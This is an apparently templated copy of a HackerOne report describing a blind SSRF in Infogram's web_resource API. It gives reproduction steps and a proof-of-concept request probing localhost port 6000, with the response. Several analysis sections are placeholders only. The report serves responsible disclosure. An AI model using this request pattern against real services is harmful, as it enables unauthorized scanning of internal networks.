# Internal Ports Scanning via Blind SSRF

## Metadata
- **Source:** HackerOne
- **Report:** 281950 | https://hackerone.com/reports/281950
- **Submitted:** 2017-10-23
- **Reporter:** tungpun
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Information Disclosure
- **CVEs:** None
- **Category:** web-api

## Summary
## Introduction:

I found a Blind SSRF issue that allows scanning internal ports.

## How to reproduce:

* Login
* Send the request `https://infogram.com/api/web_resource/url?q=[TARGET_URI]`
* Look up the response. If valid, it returns status code 200 and the website's title will be exposed, or 404 for otherwise.
For demonstration, I try scanning the *localhost* with a limited port range, then fou

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Introduction:

I found a Blind SSRF issue that allows scanning internal ports.

## How to reproduce:

* Login
* Send the request `https://infogram.com/api/web_resource/url?q=[TARGET_URI]`
* Look up the response. If valid, it returns status code 200 and the website's title will be exposed, or 404 for otherwise.
For demonstration, I try scanning the *localhost* with a limited port range, then found some available ports: *80*, *81*, *6000*.

And here is the PoC:

```
GET /api/web_resource/url?q=http://0:6000/ HTTP/1.1
...
```

Response:

```
HTTP/1.1 200 OK
...

[{"title":"Create Infographics, Charts and Maps - Infogram","description":"Infogram is an easy to use infographic and chart maker. Create and share beautiful infographics, online charts and interactive maps. Make your own here.","url":"http://0:6000/"}]
```

As the filter does not validate the input, it allows the attacker to make the GET request to the internal network.

In conclusion, I think internal addresses should not be allowed.

</details>

---
*Analysed by Claude on 2026-05-24*
